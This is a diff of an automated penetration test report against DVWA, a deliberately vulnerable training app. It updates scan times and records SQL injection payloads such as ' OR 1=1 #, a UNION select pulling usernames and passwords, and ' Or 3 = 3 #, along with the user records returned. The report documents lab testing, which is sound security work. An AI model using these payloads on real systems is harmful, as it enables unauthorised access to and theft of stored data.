@@ -1,13 +1,13 @@
 # Automated Web Pentest Report
 
-*Scan Date:* 2025-07-17T06:10:46.076062Z  
+*Scan Date:* 2025-07-17T06:21:54.806316Z  
 *Target:* Full Automated Web Pentest
 
 ## Test Environment: DVWA
 
 - *Server OS:* Kali GNU/Linux Rolling
 - *Python Version:* 3.13.3
-- *Scan Date:* 2025-07-17 06:10:46 UTC
+- *Scan Date:* 2025-07-17 06:21:54 UTC
 - *SQLmap Version:* 1.9.4#stable
 - *Target App:* DVWA (Damn Vulnerable Web Application)
 - *Version:* 1.10 Development
@@ -35,7 +35,7 @@
 | 2 | ' OR 1=1 # | Success | Critical |
 | 3 | ' union select user, password from users# | Success | Critical |
 | 4 | addadasddad | Fail | Low |
-| 5 | ' Or '1'='1 # | Fail | Low |
+| 5 | ' Or 3 = 3 # | Success | Critical |
 
 ---
 #### SQL Injection Evidence Details
@@ -118,10 +118,28 @@ Surname: 5f4dcc3b5aa765d61d8327deb882cf99
 User ID:
 ```
 
-*Severity:* `Low`
-##### Payload: `' Or '1'='1 #`
+*Severity:* `Critical`
+##### Payload: `' Or 3 = 3 #`
 ```
-User ID:
+ID: ' Or 3 = 3 #
+First name: admin
+Surname: admin
+
+ID: ' Or 3 = 3 #
+First name: Gordon
+Surname: Brown
+
+ID: ' Or 3 = 3 #
+First name: Hack
+Surname: Me
+
+ID: ' Or 3 = 3 #
+First name: Pablo
+Surname: Picasso
+
+ID: ' Or 3 = 3 #
+First name: Bob
+Surname: Smith
 ```
 
 ---
